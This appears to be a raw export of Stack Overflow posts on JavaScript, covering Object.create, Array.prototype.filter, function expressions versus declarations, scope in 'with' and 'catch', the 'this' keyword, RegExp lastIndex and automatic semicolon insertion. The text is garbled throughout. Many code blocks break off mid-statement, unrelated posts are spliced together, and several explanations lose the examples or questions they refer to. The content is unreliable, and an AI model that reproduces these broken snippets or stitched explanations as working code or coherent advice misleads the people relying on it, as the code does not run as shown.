<p>Ended up using toString because getters don't allow me to redefine the whole attribute, a function must be associated with it. And toString has cleaner syntax.</p>
","5445","","<p>Using a function is your best option <em>for now</em>, however the new JavaScript standard (ECMAScript 5th Ed.) which is being <a href=""http://kangax.github.com/es5-compat-table"" rel=""nofollow"">implemented now</a> by all major browser vendors, gives you a method to create <em>accessor properties</em>, where you can define a property with a <code>get</code> and <code>set</code> functions that will be internally called, without worrying to treat this properties as functions, e.g.:</p>

Object.defineProperty(obj, 'foo', {

","5445","","<p>With only one level of inheritance, your example may not let you see the real benefits of <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/Object/create""><code>Object.create</code></a>.</p>

<p>This methods allows you to easily implement <em>differential inheritance</em>, where objects can directly inherit from other objects.</p>

<p>On your <code>userB</code> example, I don't think that your <code>init</code> method should be public or even exist, if you call again this method on an existing object instance, the <code>id</code> and <code>name</code> properties will change.</p>

<p><code>Object.create</code> lets you initialize object properties using its second argument, e.g.:</p>

<pre><code>var userB = {
  sayHello: function() {
    console.log('Hello '+ this.name);
  }
};

var bob = Object.create(userB, {
  'id' : {

  },
  'name': {
    value: 'Bob',
    enumerable: true
  }

<p>If the code is part of a function you should know that the <code>this</code> keyword has nothing to do with the function scope, is a reserved word that is set implicitly, depending how a function is called, for example:</p>

</code></pre>

<p><em>3</em> - When the new operator is used:</p>

<pre><code>var obj = new Constructor(); // 'this' will refer to a newly created object.    
</code></pre>

<p>And you can even set the <code>this</code> value explicitly, using the <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/Function/call""><code>call</code></a> and <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/Function/call""><code>apply</code></a> methods, for example:</p>

test4(); // &lt;--- test4 will be called with `this` pointing to the global object
         // see #2 above, a call to an identifier that is not an property of an

"<p>I have the following JavaScript JSON array of real estate home objects:</p>

<pre><code>var json = { 'homes' : 
[
    {
        ""home_id"":""1"",
        ""price"":""925"",
        ""sqft"":""1100"",
        ""num_of_beds"":""2"",
        ""num_of_baths"":""2.0"",

    },
    // ... (more homes) ...     
]}
var xmlhttp = eval('(' + json + ')');
homes = xmlhttp.homes;
</code></pre>

<p>What I would like to do is be able to perform a filter on the object to return a subset of ""home"" objects.</p>

<p>For example, I want to be able to filter based on: <code>price</code>, <code>sqft</code>, <code>num_of_beds</code>, and <code>num_of_baths</code>.</p>

<p><strong>Question:</strong> How can I perform something in javascript like the pseudo-code below:</p>

<pre><code>var newArray = homes.filter(
price &lt;= 1000 &amp; 
sqft &gt;= 500 &amp; 
num_of_beds &gt;=2 &amp; 
num_of_baths &gt;= 2.5);
</code></pre>

<p>Note, the syntax does not have to be exactly like above. This is just an example.</p>
","5445","","<p>You can use the <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Objects/Array/filter""><code>Array.prototype.filter</code></a> method:</p>

<pre><code>homes.filter(function (el) {
  return el.price &lt;= 1000 &amp;&amp;
         el.sqft &gt;= 500 &amp;&amp;
         el.num_of_beds &gt;=2 &amp;&amp;
         el.num_of_baths &gt;= 2.5;
});
</code></pre>

<p>This method is part of the new <a href=""http://www.ecma-international.org/publications/standards/Ecma-262.htm"">ECMAScript 5th Edition</a> standard, and can be found on almost all modern browsers.</p>

<p>For IE, you can include the following method for compatibility:</p>

<pre><code>if (!Array.prototype.filter) {
  Array.prototype.filter = function(fun /*, thisp*/) {
    var len = this.length &gt;&gt;&gt; 0;
    if (typeof fun != ""function"")
    throw new TypeError();

    var res = [];
    var thisp = arguments[1];
    for (var i = 0; i &lt; len; i++) {
      if (i in this) {
        var val = this[i]; // in case fun mutates this
        if (fun.call(thisp, val, i, this))
        res.push(val);
      }
    }
    return res;
  };
}

"<p>In Javascript, we can call methods on string literals directly without enclosing it within round brackets. But not for other types such as numbers, or functions. It is a syntax error, but is there a reason as to why the Javascript lexer needs these other types to be enclosed in round brackets?</p>

<p>For example, if we extend Number, String, and Function with an alert method and try calling this method on the literals, it's a SyntaxError for Number and Function, while it works for a String.</p>

<pre><code>function alertValue() {
    alert(this);
}

Number.prototype.alert = alertValue;
String.prototype.alert = alertValue;
Function.prototype.alert = alertValue;
</code></pre>

<p>We can call alert directly on a string object:</p>

<pre><code>""someStringLiteral"".alert() // alerts someStringLiteral
</code></pre>

<p>but it's a SyntaxError on numbers, and functions.</p>

<pre><code>7.alert();
function() {}.alert();
</code></pre>

<p>To work with these types, we have to enclose it within brackets:</p>

<pre><code>(7).alert(); // alerts ""7""
(function() {}).alert(); // alerts ""function() {}""
</code></pre>

<p><strong>Update</strong>:</p>

<p>The link by @Crescent and answers by @Dav and @Timothy explain why <code>7.alert()</code> fails, as it's looking for a numerical constant, and to get past it, insert extra whitespace or an extra dot.</p>

<pre><code>7 .alert()
7..alert()
7. .alert();
</code></pre>

<p>Is there a similar syntactical reasons for why functions need to be enclosed in parentheses before invoking a method on them?</p>

<p>I am not well versed with interpreters and lexers to know if it's a problem that can be solved with some sort of a lookahead, as Ruby is a dynamic language and takes care of this problem. For example:-</p>

<pre><code>7.times { |i| print i }
</code></pre>

<p><strong>Update 2</strong>:</p>

<p>@CMS's answer has been spot on in understanding why functions were not working above. The statements below work:</p>

<pre><code>// comma operator forces evaluation of the function
// alerts ""function() {}""
&lt;any literal&gt;, function() {}.alert();​​​​​​​

// all examples below are forced to be evaluated as an assignment expression
var a = function() {}.alert(); 

var b = {
    x: function() { return ""property value"" }.alert()
}

[ function() { return ""array element"" }.alert() ];​
</code></pre>
","5445","","<p>For the <code>Number</code> literal all other answers have pointed you in the right direction, <code>7.</code> is a valid <code>DecimalLiteral</code>.</p>

<p>The <a href=""http://bclary.com/2004/11/07/#a-7.8.3"" rel=""nofollow"">grammar</a> tells you that the decimal digits after the first dot are optional:</p>

<pre><code>DecimalLiteral ::
DecimalIntegerLiteral . DecimalDigitsopt ExponentPartopt 
</code></pre>

<p><sub>* Note the opt suffix</sub></p>

<p>Now, for the function, the problem is that it is being evaluated in <em>statement context</em>.</p>

<p>There are two valid grammatical ways to create function objects (the third way to create functions is using the <a href=""http://bclary.com/2004/11/07/#a-15.3.2"" rel=""nofollow""><code>Function</code> constructor</a>, but for now it's out of the topic).</p>

<p>FunctionDeclaration:</p>

<pre><code>function name(/*[param] [, param] [..., param]*/) {
   // statements
}
</code></pre>

<p>Function Expression:</p>

<pre><code>var foo = function /*nameopt*/(/*[param] [, param] [..., param]*/) {
  // statements
};
</code></pre>

<p>The grammar is almost identical, the difference is where the <code>function</code> keyword appears.</p>

<p>A <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Functions#The_function_declaration_%28function_statement%29"" rel=""nofollow""><em>function declaration</em></a> occurs when the <code>function</code> keyword is found directly on global code or in the <code>FunctionBody</code> of a function.</p>

<p>A <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Functions#The_function_expression_%28function_operator%29"" rel=""nofollow""><em>function expression</em></a> occurs then the <code>function</code> keyword is found on a <em>expression</em> context, like in the above example, the second function is part of an <code>AssignmentExpression</code>.</p>

<p>But you have actually two problems, first, the name of a <code>FunctionDeclaration</code> is mandatory.</p>

<p>Second, when the <code>FunctionDeclaration</code> statement is evaluated the dot will simply cause a <code>SyntaxError</code> because the dot isn't expected.</p>

<p>Wrapping the function between parentheses (formally called <a href=""http://bclary.com/2004/11/07/#a-11.1.6"" rel=""nofollow"">The Grouping Operator</a>) makes the function to be evaluated in <em>expression context</em>, a <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Functions#The_function_expression_%28function_operator%29"" rel=""nofollow""><em>function expression</em></a>.</p>

<p>For example, the following is valid:</p>

<pre><code>0,function () {}.alert();
</code></pre>

<p>The above works because the <a href=""http://bclary.com/2004/11/07/#a-11.14"" rel=""nofollow"">comma operator</a> evaluates <em>expressions</em>.</p>

<p>You should know also that the <code>FunctionDeclarations</code> are evaluated at ""parse time"" (more precisely, when the control enters into an <a href=""http://bclary.com/2004/11/07/#a-10.2"" rel=""nofollow""><em>Execution Context</em></a>, by the <a href=""http://bclary.com/2004/11/07/#a-10.1.3"" rel=""nofollow""><em>Variable Instantiation</em></a> process), and the identifiers (function names) are made available to the entire current scope, for example:</p>

<pre><code>foo(); // alerts ""foo"", function made available at 'parse time'
foo = function () { alert('bar') }; // override with a FunctionExpression
function foo () { alert('foo'); } // FunctionDeclaration
foo(); // alerts ""bar"", the overriden function

"<p>In Javascript, when is a new scope created?  The 2 situations I know of are:</p>

<ol>
<li>with a new function  (<strong>update</strong> on 2012/09, I think it needs to be a function invocation, not just a function definition)</li>
<li>in a ""with"" statement</li>
</ol>

<p>as a note, any new block (in if-then-else, loops, or just beginning a block for no other reason) won't create a new scope.</p>

<p>Is there a third situation where a new scope is created besides the two situations above?  Thanks.</p>
","5445","","<p>Yes, there is a third case where the scope chain is augmented (besides the <code>let</code> mozilla-extension that <a href=""http://stackoverflow.com/questions/2730858/in-javascript-when-is-a-new-scope-created-with-a-new-function-and-in-a-with/2730961#2730961"">Shog9</a> mentions), when a <code>catch</code> block is evaluated:</p>

<blockquote>
  <p>The production Catch : catch
  (Identifier ) Block is evaluated as
  follows:</p>
  
  <ol>
  <li><p>Let C be the parameter that has been passed to this production.</p></li>
  <li><p>Create a new object as if by the expression new Object().</p></li>
  <li><p>Create a property in the object Result(2). The property's name is
  Identifier, valueisC. value, and
  attributes are { DontDelete }.</p></li>
  <li><p>Add Result(2) to the front of the <b>scope chain</b>.</p></li>
  <li><p>Evaluate Block.</p></li>
  <li><p>Remove Result(2) from the front of the <b>scope chain</b>.</p></li>
  <li><p>Return Result(5).</p></li>
  </ol>
</blockquote>

<p>So basically, a new object is created, with a property named like the Identifier passed to <code>catch</code>, this new object is added to the scope  chain, so we are able to use that identifier within the <code>catch</code> block.</p>

<pre><code>try {
  throw ""error"";
} catch (identifier) {
  // `identifier` accessible here..
}
</code></pre>

<p>But keep in mind that it only <em>augments</em> the current scope temporarily, to introduce the <code>catch</code> Identifier, any variable declared inside will be simply <em>hoisted</em> to the top of it enclosing function.</p>

Flash has an incredibly powerful openSocket class that allows you to connect to a server and have the server and the client talk back and forth to one another.  As far as I know there is no equivalent class in Javascript. Am I mistaken? Is there some secret mystery Ajax class that replicates the openSocket?

"<p>In Javascript, I am sometimes too immerged in the idea that a function creates a new scope, that sometimes I even think the following anonymous function will create a new scope when it is being defined and assigned to onclick:</p>

&lt;a href=""#"" id=""link2""&gt;ha link 2&lt;/a&gt;

    }

&lt;/script&gt;
</code></pre>

<p>but in fact, the anonymous function will create a new scope, that's right, but ONLY when it is being invoked, is that so?  So the <code>x</code> inside the anonymous function is not created, no new scope is created.  When the function was later invoked, there is a new scope alright, but the <code>i</code> is in the outside scope, and the <code>x</code> gets its value, and it is all 6 anyways.</p>

<p>The following code will actually invoke a function and create a new scope and that's why the <code>x</code> is a new local variable <code>x</code> in the brand new scope each time, and the invocation of the function when the link is clicked on will use the different <code>x</code> in the different scopes.</p>

<pre><code>&lt;a href=""#"" id=""link1""&gt;ha link 1&lt;/a&gt;
&lt;a href=""#"" id=""link2""&gt;ha link 2&lt;/a&gt;

        (function() {
            var x = i;
            document.getElementById('link' + i).onclick = function() { alert(x); return false; }
        })();  // invoking it now!
    }

&lt;/script&gt;
</code></pre>

<p>If we take away the <code>var</code> in front of <code>x</code>, then it is a global <code>x</code> and so no local variable <code>x</code> is created in the new scope, and therefore, clicking on the links get all the same number, which is the value of the global <code>x</code>.</p>

<p><strong>Update:</strong> the question is: we have to be careful when we analyze code, that a function will not create a scope when it is merely defined and assigned.  It has to invoked.  Is that so?</p>
","5445","","<p>The Scope of a function is set when the <a href=""http://bclary.com/2004/11/07/#a-13.2"" rel=""nofollow"">function object is created</a>, for example:</p>

<pre><code>var fn;
// augment scope chain:
with ({foo: ""bar""}) {
  fn = function () { // create function
    return foo;
  };
}​​
// restored scope chain
fn(); // ""bar""
</code></pre>

<p>In the above example, the function is created inside the <a href=""http://bclary.com/2004/11/07/#a-12.10"" rel=""nofollow""><code>with</code></a> block, there the current scope is being augmented, to introduce the object with the <code>foo</code> property to the scope chain.</p>

<p>In your second example, happens the same, the <code>onclick</code> handler function is being created inside the auto-invoking anonymous function, which itself has created a new lexical scope.</p>

<p>At the moment that function is auto-invoked on each loop iteration, the value of <code>i</code> is captured into that scope in the <code>x</code> variable, then the <code>onclick</code> handler function is created inside that scope, and it will be able to resolve it.</p>
"
"<p>If the <code>with</code> statement in Javascript creates a new scope, shouldn't clicking on the links show a different <code>x</code> which are in different scopes?  It doesn't...</p>

<pre><code>&lt;a href=""#"" id=""link1""&gt;ha link 1&lt;/a&gt;
&lt;a href=""#"" id=""link2""&gt;ha link 2&lt;/a&gt;
&lt;a href=""#"" id=""link3""&gt;ha link 3&lt;/a&gt;
&lt;a href=""#"" id=""link4""&gt;ha link 4&lt;/a&gt;
&lt;a href=""#"" id=""link5""&gt;ha link 5&lt;/a&gt;


&lt;script type=""text/javascript""&gt;

    for (i = 1; i &lt;= 5; i++) {

        with({foo:""bar""}) {
            var x = i;
            document.getElementById('link' + i).onclick = function() { alert(x); return false; }
        }

    }

&lt;/script&gt;
</code></pre>
","5445","","<p>The <code>with</code> statement doesn't creates a full new lexical scope, it just introduces an object in front of the scope chain, for example, if you capture the <code>i</code> variable, it will <a href=""http://jsbin.com/ejabi3"">work</a>:</p>

<pre><code>for (var i = 1; i &lt;= 5; i++) {
  with({x:i}) {
    document.getElementById('link' + i).onclick = function() {
      alert(x);
      return false;
    };
  }
}
</code></pre>

<p>Let me try to explain it better with another example:</p>

<pre><code>var x = 10, y = 10;   // Step 1

with ({x: 20}) {      // Step 2

  var x = 30, y = 30; // Step 3

  alert(x); // 30
  alert(y); // 30
}

alert(x); // 10
alert(y); // 30
</code></pre>

<p>In the Step 1, the <code>x</code> and <code>y</code> variables are declared and they are part of the first object in the scope chain, the global object.</p>

<p>In the Step 2, a new object (<code>{x:20}</code>) is introduced into the scope chain by the <code>with</code> statement, now the scope chain looks something like this:</p>

<pre>
   ________              ________
  | x = 10 | &lt;--------- | x = 20 |
  | y = 10 |             ¯¯¯¯¯¯¯¯¯
   ¯¯¯¯¯¯¯¯ 
</pre>

<p>In the Step 3, another <code>var</code> statement is executed, but it has no effect because as I said before, only functions create a full lexical scope.</p>

<p>The <code>var</code> statement has no effect, but the assignment has, so when the <code>x</code> variable is resolved, is reached on the first object on the scope chain, the one we introduced using <code>with</code>.</p>

<p>The <code>y</code> identifier is resolved also, but it is not found on the first object in the chain, so the lookup continues up, and finds it on the last object, the scope chain after the assignments looks like this:</p>

<pre>
   ________              ________
  | x = 10 | &lt;--------- | <b>x = 30</b> |
  | <b>y = 30</b> |             ¯¯¯¯¯¯¯¯¯
   ¯¯¯¯¯¯¯¯ 
</pre>

<p>When the <code>with</code> statement ends, the scope chain is finally restored:</p>

<pre>
   ________ 
  | x = 10 |
  | y = 30 |
   ¯¯¯¯¯¯¯¯ 
</pre>

<p><strong>Edit:</strong>
Let me expand a little bit and talk about functions.</p>

<p>When a <a href=""http://bclary.com/2004/11/07/#a-13.2"">function is created</a> its current parent scope is bound, for example:</p>

<pre><code>var fn;
// augment scope chain
with ({foo: ""bar""}) {
  fn = function () { // create function
    return foo;
  };
}​​
// restored scope chain
fn(); // ""bar"", foo is still accessible inside fn
</code></pre>

<p>A new lexical scope is created and added to the scope chain when the function is executed.</p>

<p>Basically all identifiers (names) of function arguments, variables declared with <code>var</code> and functions declared with the <code>function</code> statement, are bound as properties of a new object created behind the scenes, just before the function itself executes (when controls enters this new <a href=""http://bclary.com/2004/11/07/#a-10.2"">execution context</a>).</p>

<p>This object is not accessible through code, is called the <em>Variable Object</em>, for example:</p>

<pre><code>var x = 10, y = 10;   // Step 1

(function () {        // Step 2
  var x, y; 

  x = 30;             // Step 4
  y = 30; 

  alert(x); // 30
  alert(y); // 30
})();                 // Step 3

alert(x); // 10       // Step 5
alert(y); // 10
</code></pre>

<p>In the Step 1, again as in my first example, the <code>x</code> and <code>y</code> variables are declared and they are part of the first object in the scope chain, the global object.</p>

<p>In the Step 2, a new function object is created, the parent scope is stored in this moment, into the [[Scope]] of that function, containing now <code>x</code> and <code>y</code>.</p>

<p>In the Step 3, the function is invoked, starting the <a href=""http://bclary.com/2004/11/07/#a-10.1.3"">Variable Instantiation</a> process, which creates a new object in the scope chain, containing the locally scoped <code>x</code> and <code>y</code> variables declared inside this new function, the scope chain at this moment looks like this:</p>

<pre>
  parent scope           Variable Object
   ________              _______________
  | x = 10 | &lt;--------- | x = undefined |
  | y = 10 |            | y = undefined | 
   ¯¯¯¯¯¯¯¯              ¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯ 
</pre>

<p>Then in the Step 4, the assignment of <code>x</code> and <code>y</code> is done, but since the new lexical scope has been created, it doesn't affect the outer values.</p>

<pre>
  parent scope           Variable Object
   ________              ________
  | x = 10 | &lt;--------- | x = <b>30</b> |
  | y = 10 |            | y = <b>30</b> | 
   ¯¯¯¯¯¯¯¯              ¯¯¯¯¯¯¯¯ 
</pre>

<p>And finally, in the Step 5, the function ends and the scope chain is restored to its original state.</p>

<pre>
   ________ 
  | x = 10 |
  | y = 10 |

<p>No, it's stored on the local scope of the <code>Object.create</code> function, each time you invoke <code>Object.create</code> this function <code>F</code> will be recreated.</p>

<p>All objects have an internal property that builds the prototype chain, this property is known as <code>[[Prototype]]</code>, it's an internal property, although some implementations let you access to  it, like mozilla, with the <code>obj.__proto__</code> property.</p>

<p>The default <code>[[Prototype]]</code> when you create a new object, i.e. <code>var obj = {};</code> is <code>Object.prototype</code>.</p>

<p>All functions have a <code>prototype</code> property, this property is used when a function is used as a <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Guide/Creating_New_Objects/Using_a_Constructor_Function"">Constructor</a>, invoked with the <code>new</code> operator.</p>

<p>A new object instance it's created behind the scenes, and this object <code>[[Prototype]]</code> is set to its Constructor's <code>prototype</code> property.</p>

<blockquote>
  <p>3) Finally, F is instantiated and
  returned, becoming our newObject. Is
  the ""new"" operation strictly necessary
  here? Doesn't F already provide what
  we need, or is there a critical
  difference between function-objects
  and non-function-objects? Clearly it
  won't be possible to have a
  constructor function using this
  technique.</p>
</blockquote>

<p>Yes, the <code>new</code> operator is essential in this method.</p>

<p>The <code>new</code> operator is the only standard way to set the <code>[[Prototype]]</code> internal property of an object, if you are curious about how it works, you can give a look to the <a href=""http://www.ecma-international.org/publications/standards/Ecma-262.htm""><code>[[Construct]]</code></a> internal operation.</p>

<p>The next time <code>Object.create</code> is invoked, a new local <code>F</code> function is instantiated only within the scope of the method call, you shouldn't worry about <em>race conditions</em>.</p>

<p>Note that this implementation hardly conforms the <code>Object.create</code> described in the <a href=""http://www.ecma-international.org/publications/standards/Ecma-262.htm"">ECMAScript 5th Edition Specification</a>, in that method, you could pass a property descriptor to initialize the object.</p>

<p>A known problem is that it wonk doesn't work on cross-frame environments.</p>

<p>The <code>typeof</code> operator is not so useful, and there are some implementation bugs, for example like in Chrome or Firefox 2.x, where <code>RegExp</code> objects are detected as <code>""function""</code>, because they have made <em>callable</em> (e.g. <code>/foo/(str);</code>).</p>

<p>Some <a href=""http://gist.github.com/369052"" rel=""nofollow"">days ago</a> I was building a simple but robust <em>type detection</em> function, it uses <code>typeof</code> for primitive values, and relies on the <a href=""http://gist.github.com/369052"" rel=""nofollow""><code>[[Class]]</code></a> internal property for objects.</p>

<p>All objects have this property, implementations use it internally to detect the <em>kind</em> of the object, it is completely <em>immutable</em>, and is only accessible through the <a href=""http://bclary.com/2004/11/07/#a-15.2.4.2"" rel=""nofollow""><code>Object.prototype.toString</code></a> method:</p>

<p>Usage:</p>

<pre><code>//...
if (typeString(obj) == 'array') {
  //..
}
</code></pre>

<p>Implementation:</p>

<pre><code>function typeString(o) {
  if (typeof o != 'object')
    return typeof o;

  if (o === null)
      return ""null"";
  //object, array, function, date, regexp, string, number, boolean, error
  var internalClass = Object.prototype.toString.call(o)
                                               .match(/\[object\s(\w+)\]/)[1];

<p>The <a href=""http://gist.github.com/369052#file_type_string_no_host_types.js"" rel=""nofollow"">second variant</a> of this function is more strict, because it returns only built-in object types described in the ECMAScript specification.</p>

","5445","","<p>Your first example works, the <code>this</code> value inside the <code>helloWorld</code> function will refer to the <code>myCode</code> object itself, because you invoked it by <code>myCode.helloWorld();</code></p>

<p>When you invoke a function that is member of an object, this object will be set as the <code>this</code> value of the function.</p>

<p>In this case <code>myCode</code> is the <em>base object</em> of the <code>myCode.helloWorld</code> reference.</p>

<p>There are two more cases about how the <code>this</code> keyword is <em>implicitly</em>, for example, when you call a function that is not bound as property of any object, i.e.:</p>

<pre><code>myFunc();
</code></pre>

<p>The <code>this</code> value inside <code>myFunc</code> will point to the global object.</p>

<p>When you use the <code>new</code> operator:</p>

<pre><code>var obj = new MyFunc();
</code></pre>

<p>The <code>this</code> value inside <code>MyFunc</code> will refer to a newly created object.</p>

<p>And you can set the <code>this</code> value of a function explicitly, using <a href=""https://developer.mozilla.org/En/Core_JavaScript_1.5_Reference/Objects/Function/Call""><code>call</code></a> or <a href=""https://developer.mozilla.org/En/Core_JavaScript_1.5_Reference/Objects/Function/Apply""><code>apply</code></a>:</p>

  return this + "" World"";
}
test.call(""Hello""); // ""Hello World""

<p>Just a note, <em>that's not <a href=""http://json.org/"">JSON</a></em>, JSON is simply a data interchange format, its grammar differs with the JavaScript <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Guide/Working_with_Objects#Using_Object_Initializers"">Object Literal syntax</a>, for example:</p>

<pre><code>{ foo: ""bar"" }

"<p>Normally, I've seen prototype functions declared outside the class definition, like this:</p>

<pre><code>function Container(param) {
    this.member = param;
}
Container.prototype.stamp = function (string) {
    return this.member + string;
}

var container1 = new Container('A');
alert(container1.member);
alert(container1.stamp('X'));
</code></pre>

<p>This code produces two alerts with the values ""A"" and ""AX"".</p>

<p>I'd like to define the prototype function INSIDE of the class definition. Is there anything wrong with doing something like this?</p>

<pre><code>function Container(param) {
    this.member = param;
    if (!Container.prototype.stamp) {
        Container.prototype.stamp = function() {
            return this.member + string;
        }
    }
}
</code></pre>

<p>I was trying this so that I could access a private variable in the class. But I've discovered that if my prototype function references a private var, the value of the private var is always the value that was used when the prototype function was INITIALLY created, not the value in the object instance:</p>

<pre><code>Container = function(param) {
    this.member = param;
    var privateVar = param;
    if (!Container.prototype.stamp) {
        Container.prototype.stamp = function(string) {
            return privateVar + this.member + string;
        }
    }
}
var container1 = new Container('A');
var container2 = new Container('B');
alert(container1.stamp('X'));
alert(container2.stamp('X'));
</code></pre>

<p>This code produces two alerts with the values ""AAX"" and ""ABX"". I was hoping the output would be ""AAX"" and ""BBX"".  I'm curious why this doesn't work, and if there is some other pattern that I could use instead.</p>

<p><strong>EDIT:</strong> Note that I fully understand that for this simple example it would be best to just use a closure like <code>this.stamp = function() {}</code> and not use prototype at all. That's how I would do it too. But I was experimenting with using prototype to learn more about it and would like to know a few things:</p>

<ul>
<li>When does it make sense to use prototype functions instead of closures? I've only needed to use them to extend existing objects, like <code>Date</code>. I've read that <a href=""http://blogs.msdn.com/kristoffer/archive/2007/02/13/javascript-prototype-versus-closure-execution-speed.aspx"">closures are faster</a>.</li>
<li>If I need to use a prototype function for some reason, is it ""OK"" to define it INSIDE the class, like in my example, or should it be defined outside?</li>
<li>I'd like to understand why the privateVar value of each instance is not accessible to the prototype function, only the first instance's value.</li>
</ul>
","5445","","<blockquote>

</blockquote>

<p>Well, it's the most lightweight way to go, let's say you have a method in the <code>prototype</code> of certain constructor, and you create 1000 object instances, all those objects will have your method in their prototype chain, and all of them will refer to only <em>one function object</em>.</p>

<p>If you initialize that method inside the constructor, e.g. (<code>this.method = function () {};</code>), all of your 1000 object instances will have a function object as own property.</p>

<blockquote>

</blockquote>

<p>Defining the members of a constructor's prototype inside itself, doesn't makes much sense, I'll explain you more about it and why your code doesn't works.</p>

<blockquote>
  <p>I'd like to understand why the privateVar value of each instance is not accessible to the prototype function, only the first instance's value.</p>
</blockquote>

<p>Let's see your code:</p>

<pre><code>var Container = function(param) {
    this.member = param;
    var privateVar = param;
    if (!Container.prototype.stamp) {  // &lt;-- executed on the first call only
        Container.prototype.stamp = function(string) {
            return privateVar + this.member + string;
        }
    }
}
</code></pre>

<p>The key point about your code behavior is that the <code>Container.prototype.stamp</code> function <em>is created</em> on the first method invocation.</p>

<p>At the moment you create a function object, it stores the current enclosing scope in an internal property called <code>[[Scope]]</code>.</p>

<p>This scope is later augmented when you call the function, by the identifiers (variables) declared within it using <code>var</code> or a FunctionDeclaration.</p>

<p>A list of <code>[[Scope]]</code> properties forms the <em>scope chain</em>, and when you access an identifier (like your <code>privateVar</code> variable), those objects are examined.</p>

<p>And since your function was created on the first method invocation (<code>new Container('A')</code>), <code>privateVar</code> is bound to the Scope of this first function call, and it will remain bound to it no matter how do you call the method.</p>

<p>Give a look to this <a href=""http://stackoverflow.com/questions/2742819/if-the-with-statement-in-javascript-creates-a-new-scope-why-does-the-following/2742849#2742849"">answer</a>, the first part is about the <code>with</code> statement, but in the second part I talk about how the scope chain works for functions.</p>

"<p>How would I design an API to hide the asynchronous nature of AJAX and HTTP requests, or basically delay it to provide a fluent interface. To show an example from Twitter's new <a href=""http://platform.twitter.com/js-api.html"">Anywhere</a> API:</p>

<pre><code>// get @ded's first 20 statuses, filter only the tweets that
// mention photography, and render each into an HTML element
T.User.find('ded').timeline().first(20).filter(filterer).each(function(status) {
    $('div#tweets').append('&lt;p&gt;' + status.text + '&lt;/p&gt;');
});

function filterer(status) {
    return status.text.match(/photography/);
}
</code></pre>

<p>vs this (asynchronous nature of each call is clearly visible)</p>

<pre><code>T.User.find('ded', function(user) {
    user.timeline(function(statuses) {
        statuses.first(20).filter(filterer).each(function(status) {
            $('div#tweets').append('&lt;p&gt;' + status.text + '&lt;/p&gt;');
        });
    });
});

function filterer(status) {
    return status.text.match(/photography/);
}
</code></pre>

<p>It finds the user, gets their tweet timeline, filters only the first 20 tweets, applies a custom filter, and ultimately uses the callback function to process each tweet. </p>

<p>I am guessing that a well designed API like this should work like a query builder (think ORMs) where each function call builds the query (HTTP URL in this case), until it hits a looping function such as each/map/etc., the HTTP call is made and the passed in function becomes the callback.</p>

<p>An easy development route would be to make each AJAX call synchronous, but that's probably not the best solution. I am interested in figuring out a way to make it asynchronous, and still hide the asynchronous nature of AJAX.</p>

<p>is there any index or somrthing that has to be reset on <code>html</code> ... I'm really confused. Why <code>match</code> always returns proper result?</p>
","5445","","<p>This is a common behavior when you deal with patterns that have the global <code>g</code> flag, and you use the <code>exec</code> or <code>test</code> methods.</p>

<p>In this case the <code>RegExp</code> object will keep track of the <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/RegExp/lastIndex"" rel=""nofollow""><code>lastIndex</code></a> where a match was found, and then on subsequent matches it will start from that <code>lastIndex</code> instead of starting from 0.</p>

<p><strong>Edit:</strong> In response to your comment, <em>why doesn't the <code>RegExp</code> object being re-created when you call the function again</em>:</p>

<p>This is the behavior described for <em>regular expression literals</em>, let me quote the specification:</p>

<p><a href=""http://bclary.com/2004/11/07/#a-7.8.5"" rel=""nofollow""><strong>&sect; 7.8.5 - Regular Expression Literals</strong></a></p>

<blockquote>
  <p>...</p>
  
  <p>The object is created before evaluation of the containing program or function begins. Evaluation of the literal produces a reference to that object; it does not create a new object. </p>
  
  <p>....</p>
</blockquote>

<p>You can make a simple proof by:</p>

<pre><code>function createRe() {
  var re = /foo/g;
  return re;
}

createRe() === createRe(); // true, it's the same object
</code></pre>

<p>You can be sure that is the same object, because <em>""two regular expression literals in a program evaluate to regular expression objects that never compare as <code>===</code> to each other even if the two literals' contents are identical""</em>, e.g.:</p>

<pre><code>/foo/ === /foo/; // always false...
</code></pre>

<p>However this behavior is respected on all browser but not by IE, which initializes a new RegExp object every time.</p>

"<p>Well, first I should probably ask if this is browser dependent.</p>

<p>I've read that if an invalid token is found, but the section of code is valid until that invalid token, a semicolon is inserted before the token if it is preceded by a line break.<br>
However, the common example cited for bugs caused by semicolon insertion is:</p>

<pre><code>return
  _a+b;
</code></pre>

<p>which doesn't seem to follow this rule, since _a would be a valid token. On the other hand, breaking up call chains works as expected:</p>

<pre><code>$('#myButton')
  .click(function(){alert(""Hello!"")});
</code></pre>

<p>Does anyone have a more in-depth description of the rules?</p>
","5445","","<p>First of all you should know which statements are affected by the automatic semicolon insertion (also known as ASI for brevity):</p>

<ul>
<li>empty statement</li>
<li><code>var</code> statement</li>
<li>expression statement</li>
<li><code>do-while</code> statement</li>
<li><code>continue</code> statement</li>
<li><code>break</code> statement</li>
<li><code>return</code> statement</li>
<li><code>throw</code> statement</li>
</ul>

<p>The concrete rules of ASI, are described in the specification:</p>

<ul>
<li><a href=""http://bclary.com/2004/11/07/#a-7.9.1"">&sect;7.9.1 Rules of Automatic Semicolon Insertion</a></li>
</ul>

<p>Three cases are described:</p>

<ol>
<li><p>When a token (<code>LineTerminator</code> or <code>}</code>) is encountered that is not allowed by the grammar, a semicolon is inserted before it if: </p>

<ul>
<li>The token is separated from the previous token by at least one <code>LineTerminator</code>.</li>
<li>The token is <code>}</code></li>
</ul>

<p>E.g.:</p>

<pre><code>    { 1
    2 } 3
    // is transformed to
    { 1
    ;2 ;} 3;
</code></pre>

<p>The <code>NumericLiteral</code> <code>1</code> meets the first condition, the following token is a line terminator.
The <code>2</code> meets the second condition, the following token is <code>}</code>.</p></li>
<li><p>When the end of the input stream of tokens is encountered and the parser is unable to parse the input token stream as a single complete Program, then a semicolon is automatically inserted at the end of the input stream.</p>

<p>E.g.:</p>

<pre><code>a = b
++c
// is transformed to:
a = b;
++c;
</code></pre></li>
